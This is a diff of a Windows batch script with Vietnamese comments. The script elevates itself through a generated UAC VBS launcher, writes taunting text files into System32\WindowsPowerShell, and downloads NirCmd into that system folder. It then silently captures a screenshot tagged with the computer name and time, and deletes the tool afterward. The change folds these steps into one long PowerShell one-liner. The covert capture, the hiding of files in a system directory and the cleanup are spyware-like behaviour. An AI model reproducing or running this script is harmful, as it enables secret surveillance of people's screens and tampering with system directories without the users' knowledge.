@@ -2,43 +2,7 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe2.txt"
-del /f /q "C:\Windows\System32\WindowsPowerShell\nircmd"
-del /f /q C:\Windows\System32\WindowsPowerShell\nircmd.zip
-rmdir /s /q "C:\Windows\System32\WindowsPowerShell\nircmd"
-:: Tải nircmd.zip từ trang web NirSoft
-curl -L -o C:\Windows\System32\WindowsPowerShell\nircmd.zip https://www.nirsoft.net/utils/nircmd.zip
-
-:: Giải nén nircmd.zip vào thư mục C:\nircmd
-powershell -Command "Expand-Archive -Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip' -DestinationPath 'C:\Windows\System32\WindowsPowerShell\nircmd'"
-
-:: Xóa file zip sau khi giải nén
-del /f /q C:\Windows\System32\WindowsPowerShell\nircmd.zip
-
-
-:: Lấy tên máy tính bằng PowerShell
-for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i
-
-:: Lấy ngày và giờ hiện tại
-for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
-for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
-set DATE=%DATE:/=-%
-set TIME=%TIME::=-%
-
-:: Đường dẫn lưu ảnh màn hình vào thư mục chia sẻ mạng
-set ScreenshotPath=C:\%DeviceName%_%DATE%_%TIME%.png
-
-:: Chụp màn hình và lưu vào đường dẫn đã chỉ định
-"C:\Windows\System32\WindowsPowerShell\nircmd\nircmd.exe" savescreenshot "%ScreenshotPath%"
-
-:: Xóa các biến tạm
-set DeviceName=
-set DATE=
-set TIME=
-set ScreenshotPath=
-
-echo Ảnh màn hình đã được lưu thành công tại %ScreenshotPath%
-del /f /q C:\Windows\System32\WindowsPowerShell\nircmd
-rmdir /s /q "C:\Windows\System32\WindowsPowerShell\nircmd"
+powershell -Command "& { if (Test-Path 'C:\Windows\System32\WindowsPowerShell\nircmd') { Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\nircmd' -Recurse -Force }; if (Test-Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip') { Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip' -Force }; Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile 'C:\Windows\System32\WindowsPowerShell\nircmd.zip'; Expand-Archive -Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip' -DestinationPath 'C:\Windows\System32\WindowsPowerShell\nircmd'; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\nircmd.zip' -Force; $DeviceName = (Get-CimInstance -ClassName Win32_ComputerSystem).Name; $DATE = (Get-Date -Format 'yyyy-MM-dd'); $TIME = (Get-Date -Format 'HH-mm'); $ScreenshotPath = \"C:\$DeviceName`_$DATE`_$TIME.png\"; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\nircmd\nircmd.exe' -ArgumentList \"savescreenshot $ScreenshotPath\" -Wait; if (Test-Path 'C:\Windows\System32\WindowsPowerShell\nircmd') { Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\nircmd' -Recurse -Force }; Write-Host \"Ảnh màn hình đã được lưu thành công tại $ScreenshotPath\"; }"
 
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehehe.txt"
 exit
